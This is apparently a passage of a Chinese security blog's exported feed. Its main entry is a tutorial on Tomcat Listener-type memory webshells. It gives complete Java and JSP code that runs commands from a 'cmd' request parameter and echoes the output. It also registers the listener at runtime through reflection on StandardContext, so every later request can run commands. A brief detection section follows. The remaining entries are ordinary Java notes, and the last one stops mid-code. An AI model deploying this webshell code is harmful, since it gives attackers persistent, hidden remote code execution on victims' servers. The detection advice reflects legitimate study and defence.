Wrapper</span><br></pre></td></tr></table></figure><ul><li><code>Engine</code>：最顶层容器组件，包含多个<code>HOST</code>，实现类为<code>org.apache.catalina.core.StandardEngine</code>。</li><li><code>HOST</code>：代表一个虚拟主机，每个虚拟主机和对应域名进行匹配，包含多个<code>Context</code>，实现类为<code>org.apache.catalina.core.StandardHost</code>。</li><li><code>Context</code>：上下文容器，一个<code>Context</code>代表一个 WEB 应用，包含多个<code>Wrapper</code>，实现类为<code>org.apache.catalina.core.StandardContext</code>。</li><li><code>Wrapper</code>：一个<code>Wrapper</code>代表一个<code>Servlet</code>，是对<code>Servlet</code>的抽象包装。<code>Wrapper</code>负责管理<code>Servlrt</code>，包括<code>Servlet</code>的装载、初始化、执行和资源回收等，实习类为<code>org.apache.catalina.core.StandardWrapper</code>。</li></ul><p>示例图如下所示：<img src="images/image-20210402150543076.png" alt="image-20210402150543076"></p><h2 id="Listener型内存马的实现"><a href="#Listener型内存马的实现" class="headerlink" title="Listener型内存马的实现"></a>Listener型内存马的实现</h2><p>在前面的 JavaWeb 基础学习时，我们了解了一些<code>Listener</code>监听器。在这其中，最适合作为内存马的监听器为<code>ServletRequestListener</code>，它用于监听 ServletRequest 对象的创建和销毁过程，因此当我们发起任意请求时，都会触发<code>ServletRequestListener#requestInitialized()</code>方法。</p><p>编写一个<code>ServletRequestListener</code>接口的实现类进行测试：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.servlet.study;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/25 10:35</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ListenerTest</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) servletRequestEvent.getServletRequest();</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(cmd != <span class="literal">null</span>)&#123;</span><br><span class="line">                Runtime.getRuntime().exec(cmd);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>访问任意路由都可以执行命令<br><img src="images/image-20221028161656771.png" alt="image-20221028161656771"></p><p>不过这仅仅实现了未回显的命令执行，既然实现了命令执行，我们就得要做到回显。在 java 中，我们可以通过<code>request</code>类的<code>getResponse()</code>方法获取<code>response</code>对象<br><img src="images/image-20221028115517545.png" alt="image-20221028115517545"></p><p>那么如何获取到<code>request</code>类呢？在<code>requestInitialized()</code>方法中预设给我们传入了<code>ServletRequestEvent</code>对象，我们跟进看看<br><img src="images/image-20221028115757707.png" alt="image-20221028115757707"></p><p>这里存在一个<code>ServletRequest</code>类型的<code>request</code>字段，并且通过<code>getServletRequest()</code>方法可以拿到，而<code>servletRequestEvent</code>类可以转换成<code>HttpServletRequest</code>类型接口。</p><p><code>HttpServletRequest</code>类接口是继承<code>ServletRequest</code>接口，而<code>Request</code>类是<code>HttpServletRequest</code>接口的实现类。</p><p>因此我们可以通过反射拿到<code>ServletRequest</code>类中的<code>request</code>实例，然后经过强转类型获得<code>Request</code>对象类型<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.servlet.study;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/25 10:35</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ListenerTest</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequestEvent.getServletRequest();</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(cmd != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request) field.get(req);</span><br><span class="line">                <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> request.getResponse();</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">                <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">while</span>((a = inputStream.read(bytes))!=-<span class="number">1</span>)&#123;</span><br><span class="line">                    bao.write(bytes,<span class="number">0</span>,a);</span><br><span class="line">                &#125;</span><br><span class="line">                response.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bao.toByteArray()));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>命令执行结果成功回显<img src="images/image-20221028160217726.png" alt="image-20221028160217726"></p><p>既然我们可以通过恶意的<code>ServletRequestListener</code>实现类触发命令执行，那么接下来就是考虑如何动态注册进服务器中的问题。</p><p>在<code>Runtime.getRuntime().exec()</code>打上断点，然后带上 cmd 参数执行一次弹出计算器看看调用栈<br><img src="images/image-20221027222247432.png" alt="image-20221027222247432"></p><p>可以看到我们构造的<code>ListenerTest()</code>方法的前一个是<code>StandardContext#fireRequestInitEvent()</code>方法，跟进该方法<br><img src="images/image-20221027224618262.png" alt="image-20221027224618262"></p><p>第一行调用了<code>getApplicationEventListeners()</code>方法获取对象数组，跟进该方法<br><img src="images/image-20221027225000747.png" alt="image-20221027225000747"></p><p>可以看到，<code>applicationEventListenersList</code>字段已经存储了我们的<code>ListenerTest</code>类<br><img src="images/image-20221027225147776.png" alt="image-20221027225147776"></p><p>也就是之前已经将<code>ListenerTest</code>类注册进了 Tomcat 服务器，既然是添加我们的恶意类到<code>applicationEventListenersList</code>列表中，那么一定会有一个添加的方法，尝试在该类中全局搜索<code>applicationEventListenersList</code>关键字，最后定位到了<code>addApplicationEventListener()</code>方法<br><img src="images/image-20221027225815382.png" alt="image-20221027225815382"></p><p>因此我们可以通过<code>addApplicationEventListener()</code>方法去将我们的恶意类添加到<code>listener</code>中进行注册，接下来继续跟着方法往下走<br><img src="images/image-20221027230816656.png" alt="image-20221027230816656"></p><p>对获取到的<code>instances</code>数组遍历并进行实例化，最终调用<code>requestInitialized()</code>方法。</p><p>接下来就是如何去获取<code>StandardContext</code>类，网上可以看到师傅们都挖出了很多种办法，关于<code>StandardContext</code>类的调用寻找日后有兴趣再慢慢聊吧。这里取其中一种：<code>StandardHostValve#invoke()</code>方法中可以通过<code>request</code>对象的<code>getContext()</code>方法获取到<code>StandardContext</code>类，而 JSP 本身就内置了<code>request</code>对象<br><img src="images/image-20221027231340401.png" alt="image-20221027231340401"></p><p>接下来就是编写 Listener 型内存马<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.ByteArrayOutputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;&lt;%--</span><br><span class="line">  Created by dotast on <span class="number">2022</span>/<span class="number">10</span>/<span class="number">27</span> <span class="number">23</span>:<span class="number">16</span></span><br><span class="line">--%&gt;</span><br><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">ListenerTest</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequestEvent.getServletRequest();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>&#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span>(cmd != <span class="literal">null</span>)&#123;</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request) field.get(req);</span><br><span class="line">                    <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> request.getResponse();</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                    <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">                    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                    <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">                    <span class="keyword">while</span>((a = inputStream.read(bytes))!=-<span class="number">1</span>)&#123;</span><br><span class="line">                        bao.write(bytes,<span class="number">0</span>,a);</span><br><span class="line">                    &#125;</span><br><span class="line">                    response.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bao.toByteArray()));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) field.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">    <span class="type">ListenerTest</span> <span class="variable">listenerTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListenerTest</span>();</span><br><span class="line">    standardContext.addApplicationEventListener(listenerTest);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></p><p>访问上传的内存马文件路径使其执行代码，注册内存马<br><img src="images/image-20221028161442814.png" alt="image-20221028161442814"></p><p>接着访问其他路由都可以成功执行命令<br><img src="images/image-20221028161520448.png" alt="image-20221028161520448"></p><h2 id="内存马的查杀排查"><a href="#内存马的查杀排查" class="headerlink" title="内存马的查杀排查"></a>内存马的查杀排查</h2><p>这里使用的回忆飘如雪师傅写的内存马查杀 JSP 脚本<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/c0ny1/java-memshell-scanner</span><br></pre></td></tr></table></figure></p><p>这里扫描到我们构造的 Listener 内存马，并且提供了 dump 操作供我们检查和 kill 操作供我们进行删除。<br><img src="images/image-20221029101459352.png" alt="image-20221029101459352"></p><p>除此之外我们也可以通过日志进行排查，首先上传的内存马大多都会执行命令，如果存在大量执行了命令但返回状态码为 404 或者 200 的记录可重点进行排查。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Java项目杂事</title>
      <link href="/2021/11/10/wsdl/"/>
      <url>/2021/11/10/wsdl/</url>
      
        <content type="html"><![CDATA[<h1 id="wsdl-相关"><a href="#wsdl-相关" class="headerlink" title="wsdl 相关"></a>wsdl 相关</h1><h2 id="恢复成java代码"><a href="#恢复成java代码" class="headerlink" title="恢复成java代码"></a>恢复成java代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">wsimport -keep &quot;test.wsdl&quot; -p com.test -extension</span><br><span class="line"></span><br><span class="line">常用参数为:</span><br><span class="line">-d&lt;目录&gt;  - 将生成.class文件。默认参数。</span><br><span class="line">-s&lt;目录&gt; - 将生成.java文件。</span><br><span class="line">-p&lt;生成的新包名&gt; -将生成的类，放于指定的包下，自定义包结构。</span><br><span class="line">(wsdlurl) - http://server:port/service?wsdl，必须的参数。</span><br><span class="line">示例：</span><br><span class="line">C:/&gt; wsimport –s .</span><br><span class="line">C:/&gt; wsimport –s . –p com.sitech.web</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">注意：-s不能分开，-s后面有个小点，用于指定源代码生成的目录。点即当前目录。</span><br><span class="line">如果使用了-s参数则会在目录下生成两份代码，一份为.class代码。一份为.java代码。</span><br><span class="line">.class代码，可以经过打包以后使用。.java代码可以直接Copy到我们的项目中运行。</span><br></pre></td></tr></table></figure><h2 id="客户端调用"><a href="#客户端调用" class="headerlink" title="客户端调用"></a>客户端调用</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.cxf<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cxf-rt-frontend-jaxws<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.4.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.cxf<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cxf-rt-transports-http<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.4.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>java代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.cxf.endpoint.Client;</span><br><span class="line"><span class="keyword">import</span> org.apache.cxf.jaxws.endpoint.dynamic.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *https://www.programcreek.com/java-api-examples/?api=org.apache.cxf.jaxws.endpoint.dynamic.JaxWsDynamicClientFactory</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">JaxWsDynamicClientFactory</span> <span class="variable">factory</span> <span class="operator">=</span> JaxWsDynamicClientFactory.newInstance();</span><br><span class="line">        <span class="type">Client</span> <span class="variable">client</span> <span class="operator">=</span> factory.createClient(<span class="string">&quot;http://1.116.136.120:58081/admin/service/UserService?wsdl&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object[] objects = client.invoke(<span class="string">&quot;sayHello&quot;</span>,<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">            Arrays.stream(objects).forEach(System.out::println);</span><br><span class="line">            client.destroy();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://blog.51cto.com/u_15127638/2751110">https://blog.51cto.com/u_15127638/2751110</a><br><a href="https://blog.csdn.net/qq_32447301/article/details/79204311">https://blog.csdn.net/qq_32447301/article/details/79204311</a><br><a href="http://www.360doc.com/content/17/0105/20/835902_620335609.shtml">http://www.360doc.com/content/17/0105/20/835902_620335609.shtml</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Nothing</title>
      <link href="/2021/11/10/readobject%E6%B7%B1%E5%85%A5/"/>
      <url>/2021/11/10/readobject%E6%B7%B1%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="流程："><a href="#流程：" class="headerlink" title="流程："></a>流程：</h2><p><img src="/2021/11/10/readobject%E6%B7%B1%E5%85%A5/readobject.jpg" alt><br>ObjectInputSteram.readObject()</p><p>readObject0()</p><p>readOrdinaryObject()</p><p>desc = readClassDesc(false)</p><p>descriptor = readNonProxyDesc(unshared)</p><p>readDesc = readClassDescriptor()</p><p>cl = resolveClass(readDesc)</p><p>filterCheck(cl, -1)</p><p>desc.initNonProxy(readDesc, cl, resolveEx, readClassDesc(false))<br>各種初始化、檢查 suid 等</p><p>return desc</p><p>return descriptor</p><p>obj = desc.isInstantiable() ? desc.newInstance() : null</p><p>readSerialData(obj, desc)</p><p>slotDesc.invokeReadObject(obj, this)</p><p>readObjectMethod.invoke(obj, new Object[]{ in })</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>seacherobj</title>
      <link href="/2021/11/10/searchobj/"/>
      <url>/2021/11/10/searchobj/</url>
      
        <content type="html"><![CDATA[<h1 id="seacherobj"><a href="#seacherobj" class="headerlink" title="seacherobj"></a>seacherobj</h1><blockquote><p>学习一下searcherobj的方法</p><p><a href="https://blog.csdn.net/dhklsl/article/details/83992950">https://blog.csdn.net/dhklsl/article/details/83992950</a> </p><p><a href="https://blog.csdn.net/dhklsl/article/details/84751008">https://blog.csdn.net/dhklsl/article/details/84751008</a></p><p><a href="https://blog.csdn.net/dhklsl/article/details/88245460">https://blog.csdn.net/dhklsl/article/details/88245460</a></p></blockquote><h2 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h2><p>一个一个的去寻找</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 判断是否是List或者ArrayList</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> field</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isList</span><span class="params">(Field field)</span>&#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">simpleName</span> <span class="operator">=</span> field.getType().getSimpleName();</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;List&quot;</span>.equals(simpleName) || <span class="string">&quot;ArrayList&quot;</span>.equals(simpleName))&#123;</span><br><span class="line">        flag = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 判断是否是Map或者HashMap</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> field</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isMap</span><span class="params">(Field field)</span>&#123;</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="type">String</span> <span class="variable">simpleName</span> <span class="operator">=</span> field.getType().getSimpleName();</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&quot;Map&quot;</span>.equals(simpleName) || <span class="string">&quot;HashMap&quot;</span>.equals(simpleName))&#123;</span><br><span class="line">        flag = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 检查object是否为java的基本数据类型</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> object</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">checkObjectIsSysType</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span 